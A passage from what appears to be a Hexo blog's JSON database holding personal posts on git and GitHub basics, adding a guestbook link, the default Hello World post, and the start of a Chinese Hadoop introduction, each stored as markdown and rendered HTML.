git status\n$ git log\n```\n\n### next to rename the \"https://.......\" as origin\n\n``` bash\n$ git remote add origin https://.........(do this only the first time)\n$ git push -u origin master(the first time)\n$ git push -u origin(do this the next time)\n```\n\n### do clone\n\n``` bash\n$ git clone https://....... tutorial2(a new directory)\n```\n\n### do pull file in your date-base\n\n``` bash\n$ git pull origin master\n$ git log\n```\n\nfinally do another setting to make it better,but I meet a problem.\nSo I stop it temporarily,continue it if I have time.","source":"_posts/git-install.md","raw":"---\ntitle: Git install and setting\ndate: 2016-05-21 15:18:23\ncategories: git\ntags: git\ncomments:\n---\n### git install and setting:\n\n``` bash\n$ git config --global user.name \"name\"\n$ git config --global user.email \"email\"\n$ git config --global color.ui auto\n```\n\n### and then create a new directory as tutorial\n\n``` bash\n$ mkdir tutorial\n$ cd tutorial\n$ git init\n```\n\n### then create a new file as text.txt\n\n``` bash\n$ git status\n$ git add text.txt\n$ git status\n$ git commit -m \"text\"\n$ git status\n$ git log\n```\n\n### next to rename the \"https://.......\" as origin\n\n``` bash\n$ git remote add origin https://.........(do this only the first time)\n$ git push -u origin master(the first time)\n$ git push -u origin(do this the next time)\n```\n\n### do clone\n\n``` bash\n$ git clone https://....... tutorial2(a new directory)\n```\n\n### do pull file in your date-base\n\n``` bash\n$ git pull origin master\n$ git log\n```\n\nfinally do another setting to make it better,but I meet a problem.\nSo I stop it temporarily,continue it if I have time.","slug":"git-install","published":1,"updated":"2017-11-28T03:25:21.321Z","layout":"post","photos":[],"link":"","_id":"cjgrjscyo001ryp0lxr5pi3td","content":"<h3 id=\"git-install-and-setting\"><a href=\"#git-install-and-setting\" class=\"headerlink\" title=\"git install and setting:\"></a>git install and setting:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"email\"</span></span><br><span class=\"line\">$ git config --global color.ui auto</span><br></pre></td></tr></table></figure>\n<h3 id=\"and-then-create-a-new-directory-as-tutorial\"><a href=\"#and-then-create-a-new-directory-as-tutorial\" class=\"headerlink\" title=\"and then create a new directory as tutorial\"></a>and then create a new directory as tutorial</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir tutorial</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> tutorial</span><br><span class=\"line\">$ git init</span><br></pre></td></tr></table></figure>\n<h3 id=\"then-create-a-new-file-as-text-txt\"><a href=\"#then-create-a-new-file-as-text-txt\" class=\"headerlink\" title=\"then create a new file as text.txt\"></a>then create a new file as text.txt</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git status</span><br><span class=\"line\">$ git add text.txt</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"text\"</span></span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"next-to-rename-the-“https-……-”-as-origin\"><a href=\"#next-to-rename-the-“https-……-”-as-origin\" class=\"headerlink\" title=\"next to rename the “https://…….” as origin\"></a>next to rename the “https://…….” as origin</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin https://.........(<span class=\"keyword\">do</span> this only the first time)</span><br><span class=\"line\">$ git push -u origin master(the first time)</span><br><span class=\"line\">$ git push -u origin(<span class=\"keyword\">do</span> this the next time)</span><br></pre></td></tr></table></figure>\n<h3 id=\"do-clone\"><a href=\"#do-clone\" class=\"headerlink\" title=\"do clone\"></a>do clone</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://....... tutorial2(a new directory)</span><br></pre></td></tr></table></figure>\n<h3 id=\"do-pull-file-in-your-date-base\"><a href=\"#do-pull-file-in-your-date-base\" class=\"headerlink\" title=\"do pull file in your date-base\"></a>do pull file in your date-base</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p>finally do another setting to make it better,but I meet a problem.<br>So I stop it temporarily,continue it if I have time.</p>\n","excerpt":"","more":"<h3 id=\"git-install-and-setting\"><a href=\"#git-install-and-setting\" class=\"headerlink\" title=\"git install and setting:\"></a>git install and setting:</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"email\"</span></span><br><span class=\"line\">$ git config --global color.ui auto</span><br></pre></td></tr></table></figure>\n<h3 id=\"and-then-create-a-new-directory-as-tutorial\"><a href=\"#and-then-create-a-new-directory-as-tutorial\" class=\"headerlink\" title=\"and then create a new directory as tutorial\"></a>and then create a new directory as tutorial</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir tutorial</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> tutorial</span><br><span class=\"line\">$ git init</span><br></pre></td></tr></table></figure>\n<h3 id=\"then-create-a-new-file-as-text-txt\"><a href=\"#then-create-a-new-file-as-text-txt\" class=\"headerlink\" title=\"then create a new file as text.txt\"></a>then create a new file as text.txt</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git status</span><br><span class=\"line\">$ git add text.txt</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"text\"</span></span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"next-to-rename-the-“https-……-”-as-origin\"><a href=\"#next-to-rename-the-“https-……-”-as-origin\" class=\"headerlink\" title=\"next to rename the “https://…….” as origin\"></a>next to rename the “https://…….” as origin</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git remote add origin https://.........(<span class=\"keyword\">do</span> this only the first time)</span><br><span class=\"line\">$ git push -u origin master(the first time)</span><br><span class=\"line\">$ git push -u origin(<span class=\"keyword\">do</span> this the next time)</span><br></pre></td></tr></table></figure>\n<h3 id=\"do-clone\"><a href=\"#do-clone\" class=\"headerlink\" title=\"do clone\"></a>do clone</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://....... tutorial2(a new directory)</span><br></pre></td></tr></table></figure>\n<h3 id=\"do-pull-file-in-your-date-base\"><a href=\"#do-pull-file-in-your-date-base\" class=\"headerlink\" title=\"do pull file in your date-base\"></a>do pull file in your date-base</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p>finally do another setting to make it better,but I meet a problem.<br>So I stop it temporarily,continue it if I have time.</p>\n"},{"title":"git to gihub","date":"2016-05-25T16:00:00.000Z","_content":"**我想想，这个东西好像是上个学期寝室大神告诉我的，然而我现在才知道怎么使用它，主要是之前没接触到这个东西，不知道这东西是干嘛用的，在建blog时接触到了，对于如此难堪的水平的我来说有必要记录一下。想想感觉不应该写在blog上，觉得好好的博客怎么写这些东西了，不过尽管如此，我还是决心写一下**\n\n<!--more-->\n\n### 注册github账号\n**这个步骤省略。。。。。**\n\n### 新建repositories\n**继续省略。。。。。。**\n\n### 本地配置\n**最好新建一个目录，比如Mycode，然后将你要放在github的代码放在这个目录中如果第一次用git，需要表明你的身份，我的理解是这样的，命令行如下：**\n\n``` bash\n$ git config --global user.name \"yourname\"\n$ git config --global user.email \"youremail\"\n$ git config --global color.ui auto\n```\n\n**然后继续：**\n\n``` bash\n$ cd Mycode\n$ git init\n$ git status\n$ git add 要放在github的文件\n$ git status\n$ git commit -m \"c-program\"\n$ git status\n$ git log\n$ git remote add origin https://......\n$ git push -u origin master\n$ git push -u origin\n```\n\n**附加一些其他的**\n\n``` bash\n$ git clone https://......\n$ git pull origin master\n$ git log\n```\n\n**差不多就这些**\n\n**最近更新：**\n**同步远程仓库更新本地仓库命令**\n```\n$ git pull\n```","source":"_posts/git-to-github.md","raw":"---\ntitle: git to gihub\ndate: 2016-05-26\ncategories: git\ntags:\n  - git\n  - github\n---\n**我想想，这个东西好像是上个学期寝室大神告诉我的，然而我现在才知道怎么使用它，主要是之前没接触到这个东西，不知道这东西是干嘛用的，在建blog时接触到了，对于如此难堪的水平的我来说有必要记录一下。想想感觉不应该写在blog上，觉得好好的博客怎么写这些东西了，不过尽管如此，我还是决心写一下**\n\n<!--more-->\n\n### 注册github账号\n**这个步骤省略。。。。。**\n\n### 新建repositories\n**继续省略。。。。。。**\n\n### 本地配置\n**最好新建一个目录，比如Mycode，然后将你要放在github的代码放在这个目录中如果第一次用git，需要表明你的身份，我的理解是这样的，命令行如下：**\n\n``` bash\n$ git config --global user.name \"yourname\"\n$ git config --global user.email \"youremail\"\n$ git config --global color.ui auto\n```\n\n**然后继续：**\n\n``` bash\n$ cd Mycode\n$ git init\n$ git status\n$ git add 要放在github的文件\n$ git status\n$ git commit -m \"c-program\"\n$ git status\n$ git log\n$ git remote add origin https://......\n$ git push -u origin master\n$ git push -u origin\n```\n\n**附加一些其他的**\n\n``` bash\n$ git clone https://......\n$ git pull origin master\n$ git log\n```\n\n**差不多就这些**\n\n**最近更新：**\n**同步远程仓库更新本地仓库命令**\n```\n$ git pull\n```","slug":"git-to-github","published":1,"updated":"2017-11-28T03:25:48.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscyu001typ0lsbtfuhfi","content":"<p><strong>我想想，这个东西好像是上个学期寝室大神告诉我的，然而我现在才知道怎么使用它，主要是之前没接触到这个东西，不知道这东西是干嘛用的，在建blog时接触到了，对于如此难堪的水平的我来说有必要记录一下。想想感觉不应该写在blog上，觉得好好的博客怎么写这些东西了，不过尽管如此，我还是决心写一下</strong></p>\n<a id=\"more\"></a>\n<h3 id=\"注册github账号\"><a href=\"#注册github账号\" class=\"headerlink\" title=\"注册github账号\"></a>注册github账号</h3><p><strong>这个步骤省略。。。。。</strong></p>\n<h3 id=\"新建repositories\"><a href=\"#新建repositories\" class=\"headerlink\" title=\"新建repositories\"></a>新建repositories</h3><p><strong>继续省略。。。。。。</strong></p>\n<h3 id=\"本地配置\"><a href=\"#本地配置\" class=\"headerlink\" title=\"本地配置\"></a>本地配置</h3><p><strong>最好新建一个目录，比如Mycode，然后将你要放在github的代码放在这个目录中如果第一次用git，需要表明你的身份，我的理解是这样的，命令行如下：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"yourname\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"youremail\"</span></span><br><span class=\"line\">$ git config --global color.ui auto</span><br></pre></td></tr></table></figure>\n<p><strong>然后继续：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cd</span> Mycode</span><br><span class=\"line\">$ git init</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git add 要放在github的文件</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"c-program\"</span></span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br><span class=\"line\">$ git remote add origin https://......</span><br><span class=\"line\">$ git push -u origin master</span><br><span class=\"line\">$ git push -u origin</span><br></pre></td></tr></table></figure>\n<p><strong>附加一些其他的</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://......</span><br><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p><strong>差不多就这些</strong></p>\n<p><strong>最近更新：</strong><br><strong>同步远程仓库更新本地仓库命令</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p><strong>我想想，这个东西好像是上个学期寝室大神告诉我的，然而我现在才知道怎么使用它，主要是之前没接触到这个东西，不知道这东西是干嘛用的，在建blog时接触到了，对于如此难堪的水平的我来说有必要记录一下。想想感觉不应该写在blog上，觉得好好的博客怎么写这些东西了，不过尽管如此，我还是决心写一下</strong></p>","more":"<h3 id=\"注册github账号\"><a href=\"#注册github账号\" class=\"headerlink\" title=\"注册github账号\"></a>注册github账号</h3><p><strong>这个步骤省略。。。。。</strong></p>\n<h3 id=\"新建repositories\"><a href=\"#新建repositories\" class=\"headerlink\" title=\"新建repositories\"></a>新建repositories</h3><p><strong>继续省略。。。。。。</strong></p>\n<h3 id=\"本地配置\"><a href=\"#本地配置\" class=\"headerlink\" title=\"本地配置\"></a>本地配置</h3><p><strong>最好新建一个目录，比如Mycode，然后将你要放在github的代码放在这个目录中如果第一次用git，需要表明你的身份，我的理解是这样的，命令行如下：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"yourname\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"youremail\"</span></span><br><span class=\"line\">$ git config --global color.ui auto</span><br></pre></td></tr></table></figure>\n<p><strong>然后继续：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cd</span> Mycode</span><br><span class=\"line\">$ git init</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git add 要放在github的文件</span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git commit -m <span class=\"string\">\"c-program\"</span></span><br><span class=\"line\">$ git status</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br><span class=\"line\">$ git remote add origin https://......</span><br><span class=\"line\">$ git push -u origin master</span><br><span class=\"line\">$ git push -u origin</span><br></pre></td></tr></table></figure>\n<p><strong>附加一些其他的</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git <span class=\"built_in\">clone</span> https://......</span><br><span class=\"line\">$ git pull origin master</span><br><span class=\"line\">$ git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p><strong>差不多就这些</strong></p>\n<p><strong>最近更新：</strong><br><strong>同步远程仓库更新本地仓库命令</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git pull</span><br></pre></td></tr></table></figure></p>"},{"title":"通过留言板的添加所得到的想法","date":"2016-05-23T16:00:00.000Z","_content":"\n在添加留言板时意外收获到了我想要的外部链接，但不知道适不适用与除主页上的menu以外的地方。假设一个场景，就是你要在主页上的某个地方添加一个超链接，使点击事件发生后跳到另外一个界面，设置如下：\n\n先找到themes目录下的_config.yml这个文件打开，这个文件是themes设置文件，你可以在里面设置themes属性\n\n![1](https://github.com/fenlan/fenlan.github.io/blob/master/css/images/1.png?raw=true =100*20)\n\n这里面有layout布局，比如menu,content,sidebar等设置，我的留言板是在menu里面的，所以我在menu里面添加了这行代码：\n<!--more-->\n``` bash\nGuestbook: /guestbook\n```\n\n解释一下，Guestbook是在Header的menu中显示，效果如下\n\n![](https://github.com/fenlan/fenlan.github.io/blob/master/css/images/2.png?raw=true =100*20)\n\n后面的guestbook是在你博客主目录下的source中的一个界面名字。ok，就这样就ok了。\n","source":"_posts/guestbook.md","raw":"---\ntitle: 通过留言板的添加所得到的想法\ntags: hexo\ndate: 2016-05-24\ncategories: hexo\n---\n\n在添加留言板时意外收获到了我想要的外部链接，但不知道适不适用与除主页上的menu以外的地方。假设一个场景，就是你要在主页上的某个地方添加一个超链接，使点击事件发生后跳到另外一个界面，设置如下：\n\n先找到themes目录下的_config.yml这个文件打开，这个文件是themes设置文件，你可以在里面设置themes属性\n\n![1](https://github.com/fenlan/fenlan.github.io/blob/master/css/images/1.png?raw=true =100*20)\n\n这里面有layout布局，比如menu,content,sidebar等设置，我的留言板是在menu里面的，所以我在menu里面添加了这行代码：\n<!--more-->\n``` bash\nGuestbook: /guestbook\n```\n\n解释一下，Guestbook是在Header的menu中显示，效果如下\n\n![](https://github.com/fenlan/fenlan.github.io/blob/master/css/images/2.png?raw=true =100*20)\n\n后面的guestbook是在你博客主目录下的source中的一个界面名字。ok，就这样就ok了。\n","slug":"guestbook","published":1,"updated":"2017-11-28T02:50:26.398Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscyy001xyp0lzclwqfm8","content":"<p>在添加留言板时意外收获到了我想要的外部链接，但不知道适不适用与除主页上的menu以外的地方。假设一个场景，就是你要在主页上的某个地方添加一个超链接，使点击事件发生后跳到另外一个界面，设置如下：</p>\n<p>先找到themes目录下的_config.yml这个文件打开，这个文件是themes设置文件，你可以在里面设置themes属性</p>\n<p><img src=\"https://github.com/fenlan/fenlan.github.io/blob/master/css/images/1.png?raw=true =100*20\" alt=\"1\"></p>\n<p>这里面有layout布局，比如menu,content,sidebar等设置，我的留言板是在menu里面的，所以我在menu里面添加了这行代码：<br><a id=\"more\"></a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Guestbook: /guestbook</span><br></pre></td></tr></table></figure></p>\n<p>解释一下，Guestbook是在Header的menu中显示，效果如下</p>\n<p><img src=\"https://github.com/fenlan/fenlan.github.io/blob/master/css/images/2.png?raw=true =100*20\" alt=\"\"></p>\n<p>后面的guestbook是在你博客主目录下的source中的一个界面名字。ok，就这样就ok了。</p>\n","excerpt":"<p>在添加留言板时意外收获到了我想要的外部链接，但不知道适不适用与除主页上的menu以外的地方。假设一个场景，就是你要在主页上的某个地方添加一个超链接，使点击事件发生后跳到另外一个界面，设置如下：</p>\n<p>先找到themes目录下的_config.yml这个文件打开，这个文件是themes设置文件，你可以在里面设置themes属性</p>\n<p><img src=\"https://github.com/fenlan/fenlan.github.io/blob/master/css/images/1.png?raw=true =100*20\" alt=\"1\"></p>\n<p>这里面有layout布局，比如menu,content,sidebar等设置，我的留言板是在menu里面的，所以我在menu里面添加了这行代码：<br>","more":"<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Guestbook: /guestbook</span><br></pre></td></tr></table></figure></p>\n<p>解释一下，Guestbook是在Header的menu中显示，效果如下</p>\n<p><img src=\"https://github.com/fenlan/fenlan.github.io/blob/master/css/images/2.png?raw=true =100*20\" alt=\"\"></p>\n<p>后面的guestbook是在你博客主目录下的source中的一个界面名字。ok，就这样就ok了。</p>"},{"title":"Hello World","date":"2016-05-19T16:00:00.000Z","_content":"<font face=\"微软雅黑\">\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n</font>","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2016-05-20\n---\n<font face=\"微软雅黑\">\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n</font>","slug":"hello-world","published":1,"updated":"2017-11-21T09:14:34.698Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscz10020yp0lhes2mdfo","content":"<font face=\"微软雅黑\"><br>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"external\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"external\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"external\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"external\">GitHub</a>.<br><br>## Quick Start<br><br>### Create a new post<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"external\">Writing</a><br><br>### Run server<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"external\">Server</a><br><br>### Generate static files<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"external\">Generating</a><br><br>### Deploy to remote sites<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"external\">Deployment</a><br></font>","excerpt":"","more":"<font face=\"微软雅黑\"><br>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.<br><br>## Quick Start<br><br>### Create a new post<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a><br><br>### Run server<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a><br><br>### Generate static files<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a><br><br>### Deploy to remote sites<br><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure><br><br>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a><br></font>"},{"title":"hadoop之旅","date":"2017-09-22T07:18:23.000Z","_content":"\n## hadoop介绍\n**以下是 Hadoop 的几种定义，每种定义都针对的是企业内的不同受众：**\n- 对于高管：Hadoop 是 Apache 的一个开源软件项目，目的是从令人难以置信的数量/速度/多样性等有关组织的数据中获取价值。使用数据，而不是扔掉大部分数据。\n- 对于技术管理人员：一个开源软件套件，挖掘有关您的企业的结构化和非结构化大数据。Hadoop 集成您现有的商业智能生态系统。\n- 工程：大规模并行、无共享、基于 Java 的 map-reduce 执行环境。打算使用数百台到数千台计算机处理相同的问题，具有内置的故障恢复能力。Hadoop 生态系统中的项目提供了数据加载、更高层次的语言、自动化的云部署，以及其他功能。\n- 安全性：由 Kerberos 保护的软件套件。\n\n<!-- more -->\n\n## hadoop组件\n**下图显示了Hadoop生态系统各种组件**\n![Hadoop](http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png)\n\n**Apache Hadoop 由两个子项目组成**\n1. Hadoop MapReduce : MapReduce 是一种计算模型及软件架构，编写在Hadoop上运行的应用程序。这些MapReduce程序能够对大型集群计算节点并行处理大量的数据。\n2. HDFS (Hadoop Distributed File System): HDFS 处理 Hadoop 应用程序的存储部分。 MapReduce应用使用来自HDFS的数据。 HDFS创建数据块的多个副本，并集群分发它们到计算节点。这种分配使得应用可靠和极其迅速的计算。\n\n**如果还是不清楚，再解释一下**\n- HDFS：如果您希望有 4000 多台电脑处理您的数据，那么最好将您的数据分发给 4000 多台电脑。HDFS 可以帮助您做到这一点。HDFS 有几个可以移动的部件。Datanodes 存储数据，Namenode 跟踪存储的位置。还有其他部件，但这些已经足以使您开始了。\n- MapReduce：这是一个面向 Hadoop 的编程模型。有两个阶段，毫不意外，它们分别被称为 Map 和 Reduce。如果希望给您的朋友留下深刻的印象，那么告诉他们，Map 和 Reduce 阶段之间有一个随机排序。JobTracker 管理您的 MapReduce 作业的 4000 多个组件。TaskTracker 从 JobTracker 接受订单。如果您喜欢 Java，那么用 Java 编写代码。如果您喜欢 SQL 或 Java 以外的其他语言，您的运气仍然不错，您可以使用一个名为 Hadoop Streaming 的实用程序。\n\n**需要根本性理解这两个东西，否则配置的时候跟着教程走会遇到问题**\n**附上[参考地址1](https://wizardforcel.gitbooks.io/tutorialspoint-db/hadoop/39.html) [参考地址2](https://www.ibm.com/developerworks/cn/data/library/techarticle/dm-1209hadoopbigdata/index.html)**\n\n## 说说联机\n\n### 首先准备ssh\n**为了使用Hadoop的时候免于密码登录其他Slaves，需要对ssh进行设置。**\n**生成登录钥匙,分为公钥和私钥**\n```\nssh-keygen -t 